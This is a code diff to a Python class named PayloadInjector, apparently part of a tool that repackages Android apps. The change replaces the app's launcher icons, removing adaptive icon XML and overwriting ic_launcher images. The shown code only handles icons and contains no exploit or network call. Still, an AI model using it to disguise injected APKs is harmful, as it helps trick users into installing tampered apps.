@@ -467,7 +467,27 @@ class PayloadInjector:
                 logger.warning("res directory not found")
                 return False
             
-            # Icon directories to update (in priority order)
+            # Step 1: Remove adaptive icon XML files (they override PNG/WEBP)
+            adaptive_dirs = [
+                'mipmap-anydpi-v26',
+                'mipmap-anydpi',
+            ]
+            
+            removed_xml = 0
+            for adaptive_dir in adaptive_dirs:
+                dir_path = os.path.join(res_dir, adaptive_dir)
+                if os.path.exists(dir_path):
+                    for file in os.listdir(dir_path):
+                        if 'ic_launcher' in file.lower() and file.endswith('.xml'):
+                            xml_file = os.path.join(dir_path, file)
+                            os.remove(xml_file)
+                            removed_xml += 1
+                            logger.debug(f"Removed adaptive icon: {adaptive_dir}/{file}")
+            
+            if removed_xml > 0:
+                logger.info(f"🗑️  Removed {removed_xml} adaptive icon XML files")
+            
+            # Step 2: Replace all ic_launcher image files
             icon_dirs = [
                 'mipmap-xxxhdpi',
                 'mipmap-xxhdpi',
@@ -487,20 +507,26 @@ class PayloadInjector:
                 dir_path = os.path.join(res_dir, icon_dir)
                 
                 if not os.path.exists(dir_path):
-                    continue
+                    # Create directory if needed
+                    try:
+                        os.makedirs(dir_path, exist_ok=True)
+                    except:
+                        continue
                 
-                # Look for ic_launcher files
-                for file in os.listdir(dir_path):
-                    if file.startswith('ic_launcher') and file.endswith(('.png', '.webp', '.jpg')):
-                        target_icon = os.path.join(dir_path, file)
-                        
-                        # Get extension
-                        ext = os.path.splitext(target_icon)[1]
-                        
-                        # Copy icon (keep original extension)
+                # Replace ic_launcher files
+                # Support both PNG and WEBP
+                for icon_name in ['ic_launcher.png', 'ic_launcher.webp', 'ic_launcher_round.png', 'ic_launcher_round.webp']:
+                    target_icon = os.path.join(dir_path, icon_name)
+                    
+                    # If file exists, replace it
+                    # If not exists but directory exists, create it
+                    try:
                         shutil.copy2(icon_path, target_icon)
                         updated_count += 1
-                        logger.debug(f"Updated: {icon_dir}/{file}")
+                        logger.debug(f"Updated: {icon_dir}/{icon_name}")
+                    except Exception as e:
+                        logger.debug(f"Could not update {icon_dir}/{icon_name}: {e}")
+                        continue
             
             if updated_count > 0:
                 logger.info(f"✅ Launcher icon updated ({updated_count} files)")
